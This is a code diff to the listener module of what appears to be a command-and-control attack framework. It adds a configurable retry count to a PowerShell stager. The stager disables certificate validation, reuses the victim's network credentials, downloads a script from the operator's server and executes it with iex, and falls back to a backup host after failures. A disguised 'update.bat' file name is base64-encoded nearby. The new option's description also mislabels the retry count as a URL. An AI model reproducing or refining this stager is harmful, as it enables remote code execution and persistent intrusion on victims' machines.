@@ -162,6 +162,11 @@ class Listener(object):
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'SwitchRetry' : {
+                'Description'   :   'Url where to get backupHosts to use when up to StagerRetries.',
+                'Required'      :   True,
+                'Value'         :   5
+            },
 
         }
         
@@ -304,7 +309,8 @@ class Listener(object):
             customHeaders = profile.split('|')[2:]
             backupHostsSource = listenerOptions['BackupHostsSource']['Value']
             domainCheck = listenerOptions['DomainCheck']['Value']
-            
+            switchRetry = listenerOptions['SwitchRetry']['Value']
+
             cookie = listenerOptions['Cookie']['Value']
             # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
             if cookie == '':
@@ -417,7 +423,7 @@ class Listener(object):
                 
                 #autorun=helpers.enc_powershell("$a=New-Object System.Net.WebClient;$a.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$a.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$a.DownloadString(\""+host+"/download/po\")|iex;")
                 #cmd="do{try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$a=New-Object System.Net.WebClient;$a.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$a.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$a.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$a.DownloadString('"+host+"/download/po')|iex;break;}catch{write-verbose $_.Exception.Message -Verbose;}}while($true);"
-                cmd="[Net.ServicePointManager]::SecurityProtocol=3072;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$a=New-Object System.Net.WebClient;$a.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$a.Credentials=$a.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$retry=0;$ho='%s';while(%s){try{$retry=$retry+1;$b=$a.GetType();$b.InvokeMember('DownloadString','Public,InvokeMethod,Instance',$null,$a,$ho+'/download/po')|iex;break;}catch{sleep(10);if($retry -eq 10){$ho='%s'}}}" % ("$true" if domainCheck =='' else "[Environment]::UserDomainName -eq '"+domainCheck+"'",host,host if backupHostsSource=='' else backupHostsSource)
+                cmd="[Net.ServicePointManager]::SecurityProtocol=3072;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$a=New-Object System.Net.WebClient;$a.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$a.Credentials=$a.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$retry=0;$ho='%s';while(%s){try{$retry=$retry+1;$b=$a.GetType();$b.InvokeMember('DownloadString','Public,InvokeMethod,Instance',$null,$a,$ho+'/download/po')|iex;break;}catch{sleep(10);if($retry -eq %s){$ho='%s'}}}" % ("$true" if domainCheck =='' else "[Environment]::UserDomainName -eq '"+domainCheck+"'",host,switchRetry,host if backupHostsSource=='' else backupHostsSource)
                 #stager+="$filename=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"dXBkYXRlLnZicw==\"));"
                 stager+="$filename=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"dXBkYXRlLmJhdA==\"));"
                 #so ugly, handle dcloud temp dir
